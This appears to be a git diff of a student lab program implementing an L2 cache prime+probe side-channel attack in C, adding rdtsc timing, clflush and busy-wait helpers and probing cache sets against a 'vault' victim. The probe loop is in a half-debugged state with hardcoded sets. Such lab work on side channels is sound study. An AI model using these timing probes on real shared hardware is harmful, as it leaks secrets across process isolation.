@@ -11,6 +11,36 @@
 #include "params.h"
 #include <sys/mman.h>
 
+void printBinary(uint64_t num) {
+  for (int i = 63; i >= 0; i--) {
+    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
+    if (i % 8 == 0) {
+      putchar(' ');
+    }
+  }
+  putchar('\n');
+}
+
+// Read the Time Stamp Counter
+static inline uint64_t rdtsc() {
+  uint32_t lo, hi;
+  asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+  return ((uint64_t)hi << 32) | lo;
+}
+
+/**
+ * Busy wait for an approximate number of cycles.
+ * invariant: the number of cycles spent in this function is the least amount of cycles it should wait
+ * */
+void busy_wait_cycles(uint64_t cycles) {
+  uint64_t start = rdtsc();
+  while ((rdtsc() - start) < cycles) {
+    // Busy wait
+  }
+}
+
+
+
 // you will need to generate an eviction linked list structure with next,
 // previous pointers and time measurements
 // then you can use the shuffle function to randomize the access pattern 
@@ -20,32 +50,31 @@
 // finally you need to traverse the list one more time to retrieve 
 // the time measurements
 bool prime_probe_l2_set(int set, char *buf) {
-    bool found = false;
-    uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
+  bool found = false;
+  uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
+  uint32_t timing;
+  uint64_t lineAddr;
+  for (int i = 0; i < L2_WAYS; i++) {
+    // Set the first byte of each line to 1
+    lineAddr = addr + i * L2_LINE_SIZE;
+    (*((char *)lineAddr)) ++;
+    timing = measure_line_access_time(lineAddr);
 
-    for (int i = 0; i < L2_WAYS; i++) {
-      // Set the first byte of each line to 1
-      uint64_t lineAddr = addr + i * L2_LINE_SIZE;
-      (*((char *)lineAddr)) ++;
-      uint32_t timing = measure_line_access_time(lineAddr);
-      if (timing > 30 ) {
-//        printf("Address = %ld, set %d  timing = %d\n",lineAddr ,set, timing);
-        found = true;
-      }
-    }
+    lineAddr = addr + i * L2_LINE_SIZE;
+    clflush(lineAddr);
+    busy_wait_cycles(1249); // 78 cycles is the average time to access a line in the cache by the vault
+                                   // 78*16+1 = 1249
+    timing=measure_line_access_time(lineAddr);
 
-    return found;
-}
-
-void printBinary(uint64_t num) {
-  for (int i = 63; i >= 0; i--) {
-    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
-    if (i % 8 == 0) { // Optional: for readability, add a space every 8 bits
-      putchar(' ');
+    if (set == 992 || set == 100 ) {
+      printf("Address = %ld, set %d  timing = %d\n",lineAddr ,set, timing);
+      found = true;
     }
   }
-  putchar('\n');
+
+  return found;
 }
+
 
 int main(int argc, char const *argv[]) {
     void *buf = NULL;
@@ -61,7 +90,7 @@ int main(int argc, char const *argv[]) {
         evict_count[i] = 0;
     }
 
-    int num_reps = 10000;
+    int num_reps = 100;
     for (int rep = 0; rep < num_reps; rep++) {
         for (int set = 0; set < L2_SETS; set++) {
             if (prime_probe_l2_set(set, buf)) {
